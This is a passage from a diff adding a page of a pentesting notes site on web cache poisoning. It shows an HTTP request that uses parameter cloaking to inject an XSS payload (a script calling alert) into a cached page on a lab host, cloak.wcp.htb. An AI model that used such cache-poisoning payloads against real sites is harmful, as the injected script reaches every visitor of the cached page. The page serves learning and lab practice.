+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">cloak.wcp.htb</span></span></span></code></pre></div><p>Same rodeo, we exploit XSS and spread it to everyone</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /?language=de&amp;a=b;ref=&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt; <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">cloak.wcp.htb</span></span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+  
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xxe/" class="flex align-center">
+        <img src="/spellbook/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Xxe</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/crlf-injection/" class="flex align-center">
+        <span>Crlf Injection</span>
+        <img src="/spellbook/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#find-unkeyed-parameters">Find Unkeyed Parameters</a></li>
+    <li><a href="#fat-get">Fat GET</a></li>
+    <li><a href="#parameter-cloaking">Parameter Cloaking</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
